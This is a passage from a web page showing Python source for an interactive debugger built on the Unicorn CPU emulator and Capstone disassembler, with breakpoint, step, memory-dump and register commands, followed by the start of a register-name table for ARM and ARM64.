length, value))</span><br><span class="line">    _dbg_trace_internal(mu, pc, <span class="number">4</span>, self)</span><br><span class="line">    mu.emu_stop()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_dbg_trace_internal</span>(<span class="params">mu, address, size, self</span>):</span></span><br><span class="line">    self._is_step = <span class="literal">False</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;======================= Registers =======================&quot;</span>)</span><br><span class="line">    self.dump_reg()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;======================= Disassembly =====================&quot;</span>)</span><br><span class="line">    self.dump_asm(address, size * self.dis_count)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        raw_command = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> raw_command == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            raw_command = self._last_command</span><br><span class="line">        self._last_command = raw_command</span><br><span class="line">        command = []</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> raw_command.split():</span><br><span class="line">            <span class="keyword">if</span> c != <span class="string">&quot;&quot;</span>:</span><br><span class="line">                command.append(c)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> command[<span class="number">0</span>] == <span class="string">&#x27;set&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> command[<span class="number">1</span>] == <span class="string">&#x27;reg&#x27;</span>:  <span class="comment"># set reg regname value</span></span><br><span class="line">                    self.write_reg(command[<span class="number">2</span>], str2int(command[<span class="number">3</span>]))</span><br><span class="line">                <span class="keyword">elif</span> command[<span class="number">1</span>] == <span class="string">&#x27;bpt&#x27;</span>:</span><br><span class="line">                    self.add_bpt(str2int(command[<span class="number">2</span>]))</span><br><span class="line">                <span class="keyword">elif</span> command[<span class="number">1</span>].startswith(<span class="string">&#x27;0x&#x27;</span>) <span class="keyword">or</span> command[<span class="number">1</span>].startswith(<span class="string">&#x27;0X&#x27;</span>):</span><br><span class="line">                    self.write_mem(str2int(command[<span class="number">1</span>]),str2int(command[<span class="number">2</span>]))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;[Debugger Error]command error see help.&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>].startswith(<span class="string">&#x27;x&#x27;</span>):</span><br><span class="line">                view_amount = <span class="built_in">int</span>(self.read_ex_viewRow(command[<span class="number">0</span>])[<span class="number">2</span>:],<span class="number">10</span>)</span><br><span class="line">                <span class="keyword">if</span>(view_amount == <span class="number">0</span>):</span><br><span class="line">                    view_amount = <span class="number">1</span></span><br><span class="line">                read_fmt_str = self.read_ex_last(command[<span class="number">0</span>])</span><br><span class="line">                <span class="keyword">if</span>(read_fmt_str == <span class="string">&#x27;gx&#x27;</span>):</span><br><span class="line">                    content = self.read_mem(str2int(command[<span class="number">1</span>]), view_amount * <span class="number">8</span>)</span><br><span class="line">                    self.fmt_print_mem(read_fmt_str,str2int(command[<span class="number">1</span>]),content)</span><br><span class="line">                <span class="keyword">elif</span>(read_fmt_str == <span class="string">&#x27;wx&#x27;</span>):</span><br><span class="line">                    content = self.read_mem(str2int(command[<span class="number">1</span>]), view_amount * <span class="number">4</span>)</span><br><span class="line">                    self.fmt_print_mem(read_fmt_str,str2int(command[<span class="number">1</span>]), content)</span><br><span class="line">                <span class="keyword">elif</span>(read_fmt_str == <span class="string">&#x27;s&#x27;</span>):</span><br><span class="line">                    content = self.read_mem(str2int(command[<span class="number">1</span>]), view_amount * <span class="number">32</span>)</span><br><span class="line">                    self.fmt_print_mem(read_fmt_str,str2int(command[<span class="number">1</span>]), content)</span><br><span class="line">                <span class="keyword">elif</span>(read_fmt_str == <span class="string">&#x27;si&#x27;</span>):</span><br><span class="line">                    self.dump_asm(str2int(command[<span class="number">1</span>]), view_amount * self.dis_count)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>] == <span class="string">&#x27;s&#x27;</span> <span class="keyword">or</span> command[<span class="number">0</span>] == <span class="string">&#x27;step&#x27;</span>:</span><br><span class="line">                <span class="comment"># self._tmp_bpt = address + size</span></span><br><span class="line">                self._tmp_bpt = <span class="number">0</span></span><br><span class="line">                self._is_step = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>] == <span class="string">&#x27;n&#x27;</span> <span class="keyword">or</span> command[<span class="number">0</span>] == <span class="string">&#x27;next&#x27;</span>:</span><br><span class="line">                self._tmp_bpt = address + size</span><br><span class="line">                self._is_step = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>] == <span class="string">&#x27;r&#x27;</span> <span class="keyword">or</span> command[<span class="number">0</span>] == <span class="string">&#x27;run&#x27;</span>:</span><br><span class="line">                self._tmp_bpt = <span class="number">0</span></span><br><span class="line">                self._is_step = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>] == <span class="string">&#x27;dump&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(command) &gt;= <span class="number">3</span>:</span><br><span class="line">                    nsize = str2int(command[<span class="number">2</span>])</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    nsize = <span class="number">4</span> * <span class="number">16</span></span><br><span class="line">                self.dump_mem(str2int(command[<span class="number">1</span>]), nsize)</span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>] == <span class="string">&#x27;i&#x27;</span> <span class="keyword">or</span> command[<span class="number">0</span>] == <span class="string">&#x27;info&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> command[<span class="number">1</span>] == <span class="string">&#x27;b&#x27;</span> <span class="keyword">or</span> command[<span class="number">1</span>] == <span class="string">&#x27;bpt&#x27;</span>:</span><br><span class="line">                    self.list_bpt()</span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>] == <span class="string">&#x27;d&#x27;</span> <span class="keyword">or</span> command[<span class="number">0</span>] == <span class="string">&#x27;delete&#x27;</span>:</span><br><span class="line">                self.del_bpt(str2int(command[<span class="number">1</span>]))</span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>] == <span class="string">&#x27;stop&#x27;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>] == <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">                self._castone = self._capstone_thumb</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;======================= Disassembly =====================&quot;</span>)</span><br><span class="line">                self.dump_asm(address, size * self.dis_count)</span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>] == <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">                self._castone = self._capstone_arm</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;======================= Disassembly =====================&quot;</span>)</span><br><span class="line">                self.dump_asm(address, size * self.dis_count)</span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>] == <span class="string">&#x27;f&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot; == recent ==&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> self._tracks[-<span class="number">10</span>:-<span class="number">1</span>]:</span><br><span class="line">                    <span class="built_in">print</span>(self.sym_handler(i))</span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>] == <span class="string">&#x27;help&#x27;</span>:</span><br><span class="line">                self.show_help()</span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>] == <span class="string">&#x27;context&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;======================= Registers =======================&quot;</span>)</span><br><span class="line">                self.dump_reg()</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;======================= Disassembly =====================&quot;</span>)</span><br><span class="line">                self.dump_asm(address, size * self.dis_count)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Command Not Found!&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[Debugger Error]command error see help.&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UnicornDebugger</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, mu, mode=UDBG_MODE_ALL</span>):</span></span><br><span class="line">        self._ex_seg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;x/\d+&#x27;</span>)</span><br><span class="line">        self._tracks = []</span><br><span class="line">        self._mu = mu</span><br><span class="line">        self._arch = mu._arch</span><br><span class="line">        self._mode = mu._mode</span><br><span class="line">        self._list_bpt = []</span><br><span class="line">        self._tmp_bpt = <span class="number">0</span></span><br><span class="line">        self._error = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        self._last_command = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        self.dis_count = <span class="number">5</span></span><br><span class="line">        self._is_step = <span class="literal">False</span></span><br><span class="line">        self.sym_handler = self._default_sym_handler</span><br><span class="line">        self._capstone_arch = <span class="literal">None</span></span><br><span class="line">        self._capstone_mode = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># if self._arch != UC_ARCH_ARM:</span></span><br><span class="line">        <span class="comment">#     mu.emu_stop()</span></span><br><span class="line">        <span class="comment">#     raise RuntimeError(&quot;arch:%d is not supported! &quot; % self._arch)</span></span><br><span class="line">        <span class="keyword">if</span> self._arch == UC_ARCH_ARM:</span><br><span class="line">            capstone_arch = cp.CS_ARCH_ARM</span><br><span class="line">        <span class="keyword">elif</span> self._arch == UC_ARCH_ARM64:</span><br><span class="line">            capstone_arch = cp.CS_ARCH_ARM64</span><br><span class="line">        <span class="keyword">elif</span> self._arch == UC_ARCH_X86:</span><br><span class="line">            capstone_arch = cp.CS_ARCH_X86</span><br><span class="line">        <span class="keyword">elif</span> self._arch == UC_ARCH_MIPS:</span><br><span class="line">            capstone_arch = cp.CS_ARCH_MIPS</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            mu.emu_stop()</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;arch:%d is not supported! &quot;</span> % self._arch)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self._mode == UC_MODE_THUMB:</span><br><span class="line">            capstone_mode = cp.CS_MODE_THUMB</span><br><span class="line">        <span class="keyword">elif</span> self._mode == UC_MODE_ARM:</span><br><span class="line">            capstone_mode = cp.CS_MODE_ARM</span><br><span class="line">        <span class="keyword">elif</span> self._mode == UC_MODE_MIPS32:</span><br><span class="line">            capstone_mode = cp.CS_MODE_MIPS32</span><br><span class="line">        <span class="keyword">elif</span> self._mode == UC_MODE_MIPS32 + UC_MODE_BIG_ENDIAN:</span><br><span class="line">            capstone_mode = cp.CS_MODE_MIPS32 + cp.CS_MODE_BIG_ENDIAN</span><br><span class="line">        <span class="keyword">elif</span> self._mode == UC_MODE_MIPS64:</span><br><span class="line">            capstone_mode = cp.CS_MODE_MIPS64</span><br><span class="line">        <span class="keyword">elif</span> self._mode == UC_MODE_MIPS64 + UC_MODE_BIG_ENDIAN:</span><br><span class="line">            capstone_mode = cp.CS_MODE_MIPS64 + cp.CS_MODE_BIG_ENDIAN</span><br><span class="line">        <span class="keyword">elif</span> self._mode == UC_MODE_32:</span><br><span class="line">            capstone_mode = cp.CS_MODE_32</span><br><span class="line">        <span class="keyword">elif</span> self._mode == UC_MODE_64:</span><br><span class="line">            capstone_mode = cp.CS_MODE_64</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            mu.emu_stop()</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;mode:%d is not supported! &quot;</span> % self._mode)</span><br><span class="line"></span><br><span class="line">        self._capstone_mode = cp.Cs(capstone_arch, capstone_mode)</span><br><span class="line">        self._capstone_arch = cp.Cs(capstone_arch, capstone_mode)</span><br><span class="line">        self._capstone = self._capstone_mode</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> mode == UDBG_MODE_ALL:</span><br><span class="line">            mu.hook_add(UC_HOOK_CODE, _dbg_trace, self)</span><br><span class="line"></span><br><span class="line">        mu.hook_add(UC_HOOK_MEM_UNMAPPED, _dbg_memory, self)</span><br><span class="line">        mu.hook_add(UC_HOOK_MEM_FETCH_PROT, _dbg_memory, self)</span><br><span class="line"></span><br><span class="line">        self._regs = REG_TABLE[self._arch]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dump_mem</span>(<span class="params">self, addr, size</span>):</span></span><br><span class="line">        data = self._mu.mem_read(addr, size)</span><br><span class="line">        <span class="built_in">print</span>(advance_dump(data, addr))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dump_asm</span>(<span class="params">self, addr, size</span>):</span></span><br><span class="line">        md = self._capstone</span><br><span class="line">        code = self._mu.mem_read(addr, size)</span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> ins <span class="keyword">in</span> md.disasm(code, addr):</span><br><span class="line">            <span class="keyword">if</span> count &gt;= self.dis_count:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;%s:\t%s\t%s&quot;</span> % (self.sym_handler(ins.address), ins.mnemonic, ins.op_str))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dump_reg</span>(<span class="params">self</span>):</span></span><br><span class="line">        result_format = <span class="string">&quot;&quot;</span></span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> rid <span class="keyword">in</span> self._regs:</span><br><span class="line">            rname = self._regs[rid]</span><br><span class="line">            value = self._mu.reg_read(rid)</span><br><span class="line">            <span class="keyword">if</span> count &lt; <span class="number">4</span>:</span><br><span class="line">                result_format = result_format + rname + <span class="string">&#x27;=&#x27;</span> + <span class="built_in">hex</span>(value) + <span class="string">&#x27;\t&#x27;</span></span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                count = <span class="number">1</span></span><br><span class="line">                result_format += <span class="string">&#x27;\n&#x27;</span> + rname + <span class="string">&#x27;=&#x27;</span> + <span class="built_in">hex</span>(value) + <span class="string">&#x27;\t&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(result_format)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write_reg</span>(<span class="params">self, reg_name, value</span>):</span></span><br><span class="line">        <span class="keyword">for</span> rid <span class="keyword">in</span> self._regs:</span><br><span class="line">            rname = self._regs[rid]</span><br><span class="line">            <span class="keyword">if</span> rname == reg_name:</span><br><span class="line">                self._mu.reg_write(rid, value)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[Debugger Error] Reg not found:%s &quot;</span> % reg_name)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write_mem</span>(<span class="params">self,addr,value</span>):</span></span><br><span class="line">        <span class="built_in">str</span> = numToStr(value)</span><br><span class="line">        self._mu.mem_write(addr,<span class="built_in">str</span>.encode(<span class="string">&#x27;UTF-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_mem</span>(<span class="params">self,addr,length</span>):</span></span><br><span class="line">        <span class="built_in">str</span> = self._mu.mem_read(addr,length)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show_help</span>(<span class="params">self</span>):</span></span><br><span class="line">        help_info = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        # commands</span></span><br><span class="line"><span class="string">        # set reg &lt;regname&gt; &lt;value&gt;</span></span><br><span class="line"><span class="string">        # set bpt &lt;addr&gt;</span></span><br><span class="line"><span class="string">        # n[ext]</span></span><br><span class="line"><span class="string">        # s[etp]</span></span><br><span class="line"><span class="string">        # r[un]</span></span><br><span class="line"><span class="string">        # dump &lt;addr&gt; &lt;size&gt;</span></span><br><span class="line"><span class="string">        # i[nfo] b[pt]</span></span><br><span class="line"><span class="string">        # d[elete] &lt;bpt_Idx&gt;</span></span><br><span class="line"><span class="string">        # stop</span></span><br><span class="line"><span class="string">        # a/t change arm/thumb</span></span><br><span class="line"><span class="string">        # f show ins flow</span></span><br><span class="line"><span class="string">        # x/&lt;rowAmount&gt;&lt;gx/s/si/wx&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(help_info)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">list_bpt</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(self._list_bpt)):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[%d] %s&quot;</span> % (idx, self.sym_handler(self._list_bpt[idx])))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_bpt</span>(<span class="params">self, addr</span>):</span></span><br><span class="line">        self._list_bpt.append(addr)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">del_bpt</span>(<span class="params">self, idx</span>):</span></span><br><span class="line">        <span class="keyword">del</span> self._list_bpt[idx]</span><br><span class="line">        <span class="comment">#self._list_bpt.remove(addr)</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_tracks</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> self._tracks[-<span class="number">100</span>:-<span class="number">1</span>]:</span><br><span class="line">            <span class="comment"># print (self.sym_handler(i))</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> self._tracks</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_default_sym_handler</span>(<span class="params">self, address</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(address)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_symbol_name_handler</span>(<span class="params">self, handler</span>):</span></span><br><span class="line">        self.sym_handler = handler</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_ex_viewRow</span>(<span class="params">self,<span class="built_in">str</span></span>):</span></span><br><span class="line">        <span class="keyword">return</span> self._ex_seg.findall(<span class="built_in">str</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_ex_last</span>(<span class="params">self,<span class="built_in">str</span></span>):</span></span><br><span class="line">        <span class="keyword">return</span> self._ex_seg.sub(<span class="string">&#x27;&#x27;</span>,<span class="built_in">str</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fmt_print_mem</span>(<span class="params">self,fmt_str,addr,content</span>):</span></span><br><span class="line">        <span class="keyword">if</span>(self._mode &gt;= UC_MODE_BIG_ENDIAN):</span><br><span class="line">            ending = <span class="string">&#x27;big&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ending = <span class="string">&#x27;little&#x27;</span></span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span>(count &lt; <span class="built_in">len</span>(content)):</span><br><span class="line">            <span class="keyword">if</span>(fmt_str == <span class="string">&#x27;gx&#x27;</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;0x&#123;:0&gt;16x&#125;\t0x&#123;:0&gt;16x&#125;\t0x&#123;:0&gt;16x&#125;&quot;</span>.<span class="built_in">format</span>(addr,<span class="built_in">int</span>.from_bytes(content[<span class="number">0</span>+count:<span class="number">8</span>+count],byteorder = ending),</span><br><span class="line">                      <span class="built_in">int</span>.from_bytes(content[<span class="number">8</span>+count:<span class="number">16</span>+count],byteorder = ending)))</span><br><span class="line">                count += <span class="number">8</span></span><br><span class="line">            <span class="keyword">elif</span>(fmt_str == <span class="string">&#x27;wx&#x27;</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;0x&#123;:0&gt;8x&#125;\t0x&#123;:0&gt;8x&#125;\t0x&#123;:0&gt;8x&#125;&quot;</span>.<span class="built_in">format</span>(addr,<span class="built_in">int</span>.from_bytes(content[<span class="number">0</span>+count:<span class="number">4</span>+count],byteorder = ending),</span><br><span class="line">                      <span class="built_in">int</span>.from_bytes(content[<span class="number">4</span>+count:<span class="number">8</span>+count],byteorder = ending)))</span><br><span class="line">                count += <span class="number">4</span></span><br><span class="line">            <span class="keyword">elif</span>(fmt_str == <span class="string">&#x27;s&#x27;</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;0x&#123;:0&gt;16x&#125;\t&#123;:&gt;32s&#125;&quot;</span>.<span class="built_in">format</span>(addr,numToStr(<span class="built_in">int</span>.from_bytes(content[<span class="number">0</span>+count:<span class="number">32</span>+count],byteorder = ending))))</span><br><span class="line">                count += <span class="number">32</span></span><br></pre></td></tr></table></div></figure>


        <h4 id="uniDbg-REG-py"   >
          <a href="#uniDbg-REG-py" class="heading-link"><i class="fas fa-link"></i></a><a href="#uniDbg-REG-py" class="headerlink" title="uniDbg_REG.py"></a>uniDbg_REG.py</h4>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">REG_ARM = &#123;arm_const.UC_ARM_REG_R0: <span class="string">&quot;R0&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R1: <span class="string">&quot;R1&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R2: <span class="string">&quot;R2&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R3: <span class="string">&quot;R3&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R4: <span class="string">&quot;R4&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R5: <span class="string">&quot;R5&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R6: <span class="string">&quot;R6&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R7: <span class="string">&quot;R7&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R8: <span class="string">&quot;R8&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R9: <span class="string">&quot;R9&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R10: <span class="string">&quot;R10&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R11: <span class="string">&quot;R11&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R12: <span class="string">&quot;R12&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R13: <span class="string">&quot;R13&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R14: <span class="string">&quot;R14&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R15: <span class="string">&quot;R15&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_PC: <span class="string">&quot;PC&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_SP: <span class="string">&quot;SP&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_LR: <span class="string">&quot;LR&quot;</span></span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">REG_ARM64 = &#123;arm64_const.UC_ARM64_REG_X0: <span class="string">&quot;X0&quot;</span>,</span><br><span class="line">            arm64_const.UC_ARM64_REG_X1: <span class="string">&quot;X1&quot;</span>,</span><br><span class="line">            arm64_const.UC_ARM64_REG_X2: <span class="string">&quot;X2&quot;</span>,</span><br><span class="line">            arm64_const.UC_ARM64_REG_X3: <span class="string">&quot;X3&quot;</span>,</span><br><span class="line">            arm64_const.UC_ARM64_REG_X4: <span class="string">&quot;X4&quot;</span>,</span><br><span class="line">            arm64_const.UC_ARM64_REG_X5: <span class="string">&quot;X5&quot;</span>,</span><br><span class="line">            arm64_const.UC_ARM64_REG_X6: <span class="string">&quot;X6&quot;</span>,</span><br><span class="line">            arm64_const.UC_ARM64_REG_X7: <span class="string">&quot;X7&quot;</span>,</span><br><span class="line">            arm64_const.UC_ARM64_REG_X8: <span class="string">&quot;X8&quot;</span>,</span><br><span class="line">            arm64_const.UC_ARM64_REG_X9: <span class="string">&quot;X9&quot;</span>,</span><br><span class="line">            arm64_const.UC_ARM64_REG_X10: <span class="string">&quot;X10&quot;</span>,</span><br><span class="line">            arm64_const.UC_ARM64_REG_X11: <span class="string">&quot;X11&quot;</span>,</span><br><span class="line">            arm64_const.UC_ARM64_REG_X12: <span class="string">&quot;X12&quot;</span>,</span><br><span class="line">            arm64_const.UC_ARM64_REG_X13: <span class="string">&quot;X13&quot;</span>,</span><br><span class="line">            arm64_const.UC_ARM64_REG_X14: <span class="string">&quot;X14&quot;</span>,</span><br><span class="line">            arm64_const.UC_ARM64_REG_X15: <span class="string">&quot;X15&quot;</span>,</span><br><span class="line">            arm64_const.UC_ARM64_REG_X16: <span class="string">&quot;X16&quot;</span>,</span><br><span class="line">            arm64_const.UC_ARM64_REG_X17: <span class="string">&quot;X17&quot;</span>,</span><br><span class="line">            arm64_const.UC_ARM64_REG_X18: <span class="string">&quot;X18&quot;</span>,</span><br><span class="line">            arm64_const.UC_ARM64_REG_X19: <span class="string">&quot;X19&quot;</span>,</span><br><span class="line">            arm64_const.UC_ARM64_REG_X20: <span class="string">&quot;X20&quot;</span>,</span><br><span class="line">            arm64_const.UC_ARM64_REG_X21: <span class="string">&quot;X21&quot;</span>,</span><br><span class="line">            arm64_const.UC_ARM64_REG_X22: <span class="string">&quot;X22&quot;</span>,</span><br><span class="line">            arm64_const.UC_ARM64_REG_X23: <span class="string">&quot;X23&quot;</span>,</span><br><span class="line">            arm64_const.UC_ARM64_REG_X24: <span class="string">&quot;X24&quot;</span>,</span><br><span class="line">            arm64_const.UC_ARM64_REG_X25: <span class="string">&quot;X25&quot;</span>,</span><br><span class="line">            arm64_const.UC_ARM64_REG_X26: <span class="string">&quot;P26&quot;</span>,</span><br><span class="line">            arm64_const.UC_ARM64_REG_X27: <span class="string">&quot;X27&quot;</span>,</span><br><span class="line">            arm64_const.UC_ARM64_REG_X28: <span class="string">&quot;X28&quot;</span>,</span><br><span class="line">            arm64_const.UC_ARM64_REG_X29: <span class="string">&quot;X29&quot;</span>,</span><br><span 